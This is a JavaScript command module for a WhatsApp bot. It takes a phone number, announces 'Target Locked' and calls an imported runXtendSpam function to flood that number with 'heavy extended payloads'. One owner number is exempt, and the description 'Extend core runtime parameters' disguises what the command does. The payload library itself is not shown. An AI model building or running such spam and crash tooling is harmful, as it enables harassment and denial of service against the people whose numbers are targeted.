const { runXtendSpam } = require('../lib/rizouxtend');

module.exports = {
  name: "rizouxtend",
  commands: ['xtend', 'rizouxtend', 'inrespext'],
  category: "owner",
  description: "Extend core runtime parameters",
  async execute(sock, m, args) {
    if (!args[0]) {
      return sock.sendMessage(m.chat, { text: `📌 *Usage:* .xtend 923xx` }, { quoted: m });
    }

    let pepec = (args[0] || "").replace(/[^0-9]/g, "");
    if (!pepec) return sock.sendMessage(m.chat, { text: '❌ *Invalid number format!*' }, { quoted: m });

    let protectedNumbers = ["923154734548"];
    if (protectedNumbers.includes(pepec)) {
      return sock.sendMessage(m.chat, { text: '🔒 *This number is protected!*' }, { quoted: m });
    }

    let target = pepec + '@s.whatsapp.net';
    await sock.sendMessage(m.chat, { text: `🔥 *inRespXtend Target Locked:* ${pepec}\n⚡ *Spamming heavy extended payloads...*` }, { quoted: m });

    try {
      runXtendSpam(sock, target);
      await sock.sendMessage(m.chat, { react: { text: "💥", key: m.key } });
    } catch (error) {
      await sock.sendMessage(m.chat, { text: "⚠️ Error: inRespXtend execute karte waqt masla aaya hai." }, { quoted: m });
    }
  }
};
